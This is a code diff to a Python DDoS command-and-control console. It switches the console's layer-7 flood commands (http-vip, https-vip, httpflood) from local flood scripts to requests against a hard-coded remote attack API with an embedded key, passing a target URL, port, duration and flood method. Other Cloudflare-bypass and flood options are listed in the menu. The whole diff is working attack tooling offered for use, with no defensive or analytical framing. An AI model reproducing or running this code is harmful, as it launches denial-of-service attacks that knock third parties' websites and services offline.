@@ -119,8 +119,8 @@ def layer7():
                               \x1b[38;2;233;233;233m║    \x1b[38;2;0;255;255mLAYER 7    \x1b[38;2;233;233;233m║
                \x1b[38;2;233;233;233m╔══════════════╩════════╦══════╩══════════════╗
                \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttps-spammer       \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttp-raw          \x1b[38;2;233;233;233m║
-               \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttp-socket         \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;233;233;233m║
-               \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttp-storm          \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mcf-socket         \x1b[38;2;233;233;233m║
+               \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttps-vip           \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;233;233;233m║
+               \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttp-vip            \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mcf-socket         \x1b[38;2;233;233;233m║
                \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mcf-pro            \x1b[38;2;233;233;233m║
                \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mtls                 \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mhyper             \x1b[38;2;233;233;233m║
                \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mcf-bypass           \x1b[38;2;233;233;233m║   \x1b[38;2;0;255;255mslow              \x1b[38;2;233;233;233m║
@@ -453,15 +453,19 @@ def main():
             except IndexError:
                 print('cf-socket')
         
-        elif "http-socket" in cnc:
+        elif "http-vip" in cnc:
             try:
                 url = cnc.split()[1]
-                per = cnc.split()[2]
+                port = cnc.split()[2]
                 time = cnc.split()[3]
-                os.system(f'node HTTP-SOCKET {url} {per} {time}')
+                try:
+                    r = requests.get(f'http://213.32.61.80:8080/api?key=keyasdas12&host={url}&port={port}&time={time}&method=http-premium')
+                    print(r.text)
+                except:
+                    print("API Server Error")
             except IndexError:
-                print('Usage: http-socket <url> <per> <time>')
-                print('Example: http-socket http://example.com 5000 60')
+                print('Usage: http-vip <url> <port> <time>')
+                print('Example: http-vip https://example.co 443 60')
 
         elif "http-raw" in cnc:
             try:
@@ -481,15 +485,19 @@ def main():
                 print('Usage: http-rand <url> <time>')
                 print('Example: http-rand http://vailon.com/ 60')
 
-        elif "overflow" in cnc:
+        elif "https-vip" in cnc:
             try:
-                ip = cnc.split()[1]
+                url = cnc.split()[1]
                 port = cnc.split()[2]
-                thread = cnc.split()[3]
-                os.system(f'./OVERFLOW {ip} {port} {thread}')
+                time = cnc.split()[3]
+                try:
+                    r = requests.get(f'http://213.32.61.80:8080/api?key=keyasdas12&host={url}&port={port}&time={time}&method=https-premium')
+                    print(r.text)
+                except:
+                    print("API Server Error")
             except IndexError:
-                print('Usage: overflow <ip> <port> <threads>')
-                print('Example: overflow 1.1.1.1 80 5000')
+                print('Usage: https-vip <url> <port> <time>')
+                print('Example: https-vip https://example.co 443 60')
 
         elif "cf-bypass" in cnc:
             try:
@@ -525,13 +533,16 @@ def main():
         elif "httpflood" in cnc:
             try:
                 url = cnc.split()[1]
-                thread = cnc.split()[2]
-                method = cnc.split()[3]
-                time = cnc.split()[4]
-                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
+                port = cnc.split()[2]
+                time = cnc.split()[3]
+                try:
+                    r = requests.get(f'http://213.32.61.80:8080/api?key=keyasdas12&host={url}&port={port}&time={time}&method=http-flood')
+                    print(r.text)
+                except:
+                    print("API Server Error")
             except IndexError:
-                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
-                print('Example: httpflood http://example.com 15000 get 60')
+                print('Usage: httpflood <url> <port> <time>')
+                print('Example: httpflood https://example.co 443 60')
 
         elif "https-spammer" in cnc:
             try:
